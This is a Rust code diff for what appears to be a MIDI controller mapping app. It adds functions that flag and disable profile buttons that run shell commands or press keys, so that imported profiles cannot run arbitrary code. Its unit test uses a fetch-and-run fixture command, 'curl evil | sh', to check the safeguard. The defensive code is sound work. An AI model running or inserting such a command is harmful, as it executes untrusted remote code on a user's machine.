@@ -592,6 +592,29 @@ impl Profile {
         Ok(p)
     }
 
+    /// Buttons that run a command or press keys, described for a warning.
+    /// A profile from somewhere else could use them to run anything.
+    pub fn risky_buttons(&self) -> Vec<String> {
+        let name = |cid: &str| self.controls.get(cid).map_or(cid.to_string(), |c| c.name.clone());
+        self.buttons
+            .iter()
+            .filter_map(|(cid, a)| match a {
+                ButtonAction::Command { command } => Some(format!("{}: runs `{command}`", name(cid))),
+                ButtonAction::Keys { keys } => Some(format!("{}: presses {keys}", name(cid))),
+                _ => None,
+            })
+            .collect()
+    }
+
+    /// Turn the buttons from [`Profile::risky_buttons`] off.
+    pub fn disarm(&mut self) {
+        for a in self.buttons.values_mut() {
+            if matches!(a, ButtonAction::Command { .. } | ButtonAction::Keys { .. }) {
+                *a = ButtonAction::None;
+            }
+        }
+    }
+
     /// The profile in the original app's format (without this app's extras).
     pub fn to_spec_json(&self) -> Result<String> {
         let mut p = self.clone();
@@ -715,6 +738,24 @@ fn is_one(v: &f32) -> bool {
 #[cfg(test)]
 mod tests {
     use super::*;
+
+    #[test]
+    fn imported_commands_are_disarmed() {
+        let mut p = Profile::nanokontrol2();
+        let (play, stop) = {
+            let mut ids = p.buttons.keys().cloned();
+            (ids.next().unwrap(), ids.next().unwrap())
+        };
+        p.buttons.insert(play, ButtonAction::Command { command: "curl evil | sh".into() });
+        p.buttons.insert(stop, ButtonAction::Keys { keys: "ctrl+alt+t".into() });
+        let risky = p.risky_buttons();
+        assert_eq!(risky.len(), 2, "{risky:?}");
+        assert!(risky[0].contains("curl evil | sh"));
+        p.disarm();
+        assert!(p.risky_buttons().is_empty());
+        // Other buttons are left alone.
+        assert!(p.buttons.values().any(|a| matches!(a, ButtonAction::Bank { .. })));
+    }
 
     #[test]
     fn group_settings_compat() {
